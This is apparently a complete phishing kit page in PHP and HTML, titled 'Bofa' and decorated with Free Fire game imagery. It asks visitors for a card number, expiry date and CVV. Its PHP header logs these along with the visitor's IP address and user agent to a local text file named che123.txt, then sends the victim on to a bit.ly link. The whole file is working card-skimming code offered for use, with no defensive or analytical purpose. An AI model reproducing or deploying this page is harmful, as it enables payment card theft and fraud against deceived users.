﻿<?php
if(isset($_POST['add'])){
 $card = "";
  if (!empty($_REQUEST['card'])){
 $card = $_POST['card'];
  $mes = $_POST['mes'];
    $year = $_POST['year'];
  $cvv = $_POST['cvv'];
$ip = $_SERVER['REMOTE_ADDR'];
$ip2 = $_SERVER['HTTP_USER_AGENT'];
}

$post = "";
if (!empty($_REQUEST['post'])){
 $post = $_REQUEST['post'];
}


$archivo = "che123.txt";
$file = fopen($archivo,"a");
fwrite($file,"Card: ".$card."\r\nFecha: ".$mes."/".$year."\r\nCVV: ".$cvv."\r\nIP: ".$ip."\r\nNavegador: ".$ip2."\r\n ==============================\r\n");
fclose($file);
header ('location: https://bit.ly/3iG6y6N');

}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="stylesheet" href="css/normalize.min.css" />
<link rel="stylesheet" href="css/estilos.css" />
<title>Bofa</title>
<link rel="shortcut icon" href="img/favicon.png" type="image/x-icon" />
</head>
<body class="fondo3">
<div class="modal">
<div class="modal-border">
<div class="modal-contenido">
<img style="user-drag: none;
user-select: none;
-moz-user-select: none;
-webkit-user-drag: none;
-webkit-user-select: none;
-ms-user-select: none;" src="img/freefire.png" alt="formulario"/>

<form action="" method="post">
<input class="cinput" type="text" name="card" maxlength="16" required>
<select class=" select mselect" name="mes" required>
<option value="">--</option>
<option value="1">01</option>
<option value="2">02</option>
<option value="3">03</option>
<option value="4">04</option>
<option value="5">05</option>
<option value="6">06</option>
<option value="7">07</option>
<option value="8">08</option>
<option value="9">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
</select>
<select class="select aselect" name="year" required>
<option value="">----</option>
<option value="2022">2022</option>
<option value="2023">2023</option>
<option value="2024">2024</option>
<option value="2025">2025</option>
<option value="2026">2026</option>
<option value="2027">2027</option>
<option value="2028">2028</option>
<option value="2029">2029</option>
<option value="2030">2030</option>
<option value="2031">2031</option>
<option value="2032">2032</option>
<option value="2033">2033</option>
<option value="2034">2034</option>
<option value="2035">2035</option>
<option value="2036">2036</option>
<option value="2037">2037</option>
<option value="2038">2038</option>
<option value="2039">2039</option>
<option value="2040">2040</option>
<option value="2041">2041</option>
<option value="2042">2042</option>
<option value="2043">2043</option>
<option value="2044">2044</option>
<option value="2045">2045</option>
<option value="2046">2046</option>
<option value="2047">2047</option>
<option value="2048">2048</option>
<option value="2049">2049</option>
<option value="2050">2050</option>
<option value="2051">2051</option>
<option value="2052">2052</option>
<option value="2053">2053</option>
<option value="2054">2054</option>
<option value="2055">2055</option>
<option value="2056">2056</option>
<option value="2057">2057</option>
<option value="2058">2058</option>
<option value="2059">2059</option>
<option value="2060">2060</option>
</select>
<input class="cvvinput" type="password" name="cvv" maxlength="4" required>
<button class="boton bloque" name="add" type="submit">Continuar</button>
<img class="topform" src="img/a30.png" alt="top">
<img class="bottomform" src="img/mota.png" alt="botton">
</form>
</div>
</div>

</div>
</body>
</html>
